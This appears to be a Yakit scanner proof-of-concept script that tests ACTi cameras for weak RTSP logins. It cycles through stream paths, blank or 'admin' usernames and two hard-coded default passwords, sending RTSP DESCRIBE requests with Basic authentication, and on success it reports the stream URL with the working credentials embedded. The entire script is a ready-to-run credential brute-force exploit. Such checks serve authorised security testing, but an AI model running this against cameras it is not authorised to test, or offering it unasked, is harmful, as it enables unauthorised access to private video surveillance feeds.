##server:ACTI Camera
##type:poc
##params:root_url
##name:acti_rtsp_weakpassword_poc
##severity:high
##out_put:acti_rtsp_path,acti_rtsp_username,acti_rtsp_password




loglevel(`info`)
yakit.AutoInitYakit()

path_list = ["stream1", "stream2", "stream3", "1"]

username_list = ["admin", ""]

password_list = ["zyaq@123", "123456"]

create_test_packet = func(ip, path) {
    return create_core_packet(ip, path) + b"\r\n"
}

create_core_packet = func(ip, path) {
    COREPACKET = b"DESCRIBE rtsp://%s/%s RTSP/1.0\r\n" % [ip, path]
    COREPACKET += b"CSeq: 2\r\n"
    return COREPACKET
}

create_basic_packet = func(user, password, ip, path) {
    account = user + ":" + password
    // account = bytes(account, encoding="utf8")
    dump(account)
    ecreds = codec.EncodeBase64(account)

    setup_pkt = create_core_packet(ip, path)
    setup_pkt += b"Authorization: Basic " + b"%s" % [ecreds] + b"\r\n\r\n"
    return setup_pkt
}

is_Login_OK = func(s) {
    // dump(s)
    if str.MatchAnyOfSubString(s, ["200 OK", "406"]...) {
        // println(111)
        return true
    }

    return false
}

res_output = func(rtsp_path, username, password) {
    risk.NewRisk(
        root_url, 
        risk.severity("high"), 
        risk.title(f"FOUND ${root_url} 存在ACTI RTSP弱口令漏洞"), 
        risk.titleVerbose("ACTI RTSP弱口令漏洞"), 
        risk.type("身份伪造"), 
        risk.typeVerbose("配置错误"), 
        risk.details({
            "acti_rtsp_path": rtsp_path, 
            "acti_rtsp_username": username, 
            "acti_rtsp_password": password}), 
    )
}

send_and_check = func(ip, port, pkt, username, password, path) {
    conn, err = tcp.Connect(ip, port, tcp.clientTimeout(5))
    if err != nil {
        die(err)
    }

    conn.send(pkt)
    reply, err = conn.RecvTimeout(5)
    if err != nil {
        die(err)
    }

    if is_Login_OK(reply) {
        rtsp_path = "rtsp://"
        core_path = ip + ":" + string(port) + "/" + path
        if username == "" {
            rtsp_path = rtsp_path + core_path
        } else {
            rtsp_path = rtsp_path + username + ":" + password + "@" + core_path
        }

        res_output(rtsp_path, username, password)
    }

}

poc = func(ip, port) {
    for path in path_list {
        for username in username_list {
            for password in password_list {
                if username == "" || password == "" {
                    pkt = create_test_packet(ip, path)
                    send_and_check(ip, port, pkt, username, password,path)
                } else {
                    pkt = create_basic_packet(username, password,ip,path)
                    send_and_check(ip, port, pkt, username, password,path)
                }

            }

        }

    }

}

root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}

poc(ip, port)
